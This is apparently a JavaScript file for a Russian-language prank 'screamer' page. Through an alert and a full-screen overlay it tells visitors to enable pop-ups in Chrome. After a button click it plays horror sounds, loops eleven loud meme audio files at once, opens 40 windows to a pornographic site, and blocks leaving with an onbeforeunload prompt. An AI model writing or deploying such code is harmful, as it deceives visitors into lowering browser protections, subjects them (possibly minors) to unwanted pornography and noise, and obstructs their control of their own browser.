const image = document.querySelector(".img")
let buttonCreated = false; // Флаг, указывающий, был ли создан кнопка  
let audio = new Audio('sound/sound.mp3'); // Замените на ваш URL аудиофайла  
let audio2 = new Audio('sound/sigma-boy-bass-boosted-caca.mp3'); // Замените на ваш URL аудиофайла  
let audio3 = new Audio('sound/bombardiro-crocodilo.mp3'); // Замените на ваш URL аудиофайла  
let audio4 = new Audio('sound/999-social-credit-siren.mp3'); // Замените на ваш URL аудиофайла  
let audio5 = new Audio('sound/goofy-ahh-car-horn-sound-effect.mp3'); // Замените на ваш URL аудиофайла  
let audio6 = new Audio('sound/long-brain-fart.mp3'); // Замените на ваш URL аудиофайла  
let audio7 = new Audio('sound/y2mate_5gbydy1.mp3'); // Замените на ваш URL аудиофайла  
let audio8 = new Audio('sound/jg-032316-sfx-horror-style-impact-3.mp3'); // Замените на ваш URL аудиофайла
let audio9 = new Audio('sound/the-hell_hZeqGOoV.mp3'); // Замените на ваш URL аудиофайла
let audio10 = new Audio('sound/sonicexe-laugh-15980.mp3'); // Замените на ваш URL аудиофайла
let audio11 = new Audio('sound/sonic-exe.mp3'); // Замените на ваш URL аудиофайла
const timeout = 7500; // Задержка в миллисекундах перед выполнением действия
const timeout1 = 5500; // Задержка в миллисекундах перед выполнением действия
showFullScreenMessage();  
showInstructions()



audio.loop = true; // Установите зацикливание аудио  
audio2.loop = true; // Установите зацикливание аудио  
audio3.loop = true; // Установите зацикливание аудио  
audio4.loop = true; // Установите зацикливание аудио  
audio5.loop = true; // Установите зацикливание аудио  
audio6.loop = true; // Установите зацикливание аудио  
audio7.loop = true; // Установите зацикливание аудио  
audio11.loop = true; // Установите зацикливание аудио

function createButton() {  
    if (!buttonCreated) { // Проверяем, если кнопка уже создана  
        // Скрываем начальную кнопку  
        audio8.play(); // Воспроизводим звук
        document.getElementById('initialButton').style.display = 'none';  
        document.body.style.backgroundColor = 'black';  
``
        // Создаем новую кнопку  
        const newButton = document.createElement('button');  
        newButton.textContent = 'Я тебя предупредил'; // Текст на новой кнопке  
        newButton.className = 'new-button'; // Применяем новый класс к кнопке  
        newButton.onclick = function () {  
            newButton.style.display = "none" // Скрываем кнопку
            audio9.play(); // Воспроизводим звук

            setTimeout(() => {
                // Задержка перед выполнением действия
                audio10.play(); // Воспроизводим звук
            }, timeout1); // Задержка перед выполнением действия

            setTimeout(() => {
             // Задержка перед выполнением действия
            newButton.style.display = "none"
            audio.play(); // Воспроизводим звук  
            audio2.play(); // Воспроизводим звук  
            audio3.play(); // Воспроизводим звук  
            audio4.play(); // Воспроизводим звук  
            audio5.play(); // Воспроизводим звук  
            audio6.play(); // Воспроизводим звук  
            audio7.play(); // Воспроизводим звук  
            audio11.play(); // Воспроизводим звук
            openRedirect(); // Вызываем функцию для перенаправления  
            image.classList.remove("img1")
            image.classList.toggle("img2")
        }, timeout);
        };  

        document.body.appendChild(newButton); // Добавляем кнопку на страницу  
    }  
}  
function showInstructions() {  
    // Инструкции по включению всплывающих окон для Google Chrome  
    const instructionsText = `  
    **Пожалуйста, включите всплывающие окна для этого сайта:**  
    
    Для Google Chrome:  
    1. Нажмите на три точки (меню) в правом верхнем углу браузера.  
    2. Выберите "Настройки".  
    3. Прокрутите вниз и нажмите на "Конфиденциальность и безопасность".  
    4. Перейдите в раздел "Настройки сайта".  
    5. Найдите раздел "Всплывающие окна и перенаправления".  
    6. Убедитесь, что переключатель включен (позволяет всплывающие окна).  
    7. Добавьте этот сайт в исключения, чтобы разрешить всплывающие окна.  
    `;  
    
    alert(instructionsText); // Показать предупреждение с инструкцией  
}  

function openRedirect() {  
    for (let i = 0; i < 40; i++) {  
        const newWindow = window.open('https://pornhub.com', '_blank'); 
    }  
} 


// Функция для показа сообщения на весь экран  
function showFullScreenMessage() {  
    const messageDiv = document.createElement('div');  
    messageDiv.style.position = 'fixed';  
    messageDiv.style.top = '0';  
    messageDiv.style.left = '0';  
    messageDiv.style.width = '100vw';  
    messageDiv.style.height = '100vh';  
    messageDiv.style.backgroundColor = 'rgba(0, 0, 0, 0.8)'; // Полупрозрачный черный фон  
    messageDiv.style.color = 'white';  
    messageDiv.style.display = 'flex';  
    messageDiv.style.justifyContent = 'center';  
    messageDiv.style.alignItems = 'center';  
    messageDiv.style.fontSize = '48px'; // Размер шрифта  
    messageDiv.innerText = 'Включите доступ к всплывающим окнам'; // Текст сообщения  
    messageDiv.style.zIndex = '9999'; // Чтобы сообщение отображалось поверх остальных элементов  

    document.body.appendChild(messageDiv);  

    // Убираем сообщение по клику  
    messageDiv.addEventListener('click', () => {  
        document.body.removeChild(messageDiv);  
    });  
}  

// Обрабатываем события попыток закрытия страницы  
window.onbeforeunload = function () {  
    return 'ХАХХАХАХАХАХАХАХАХ';  
};  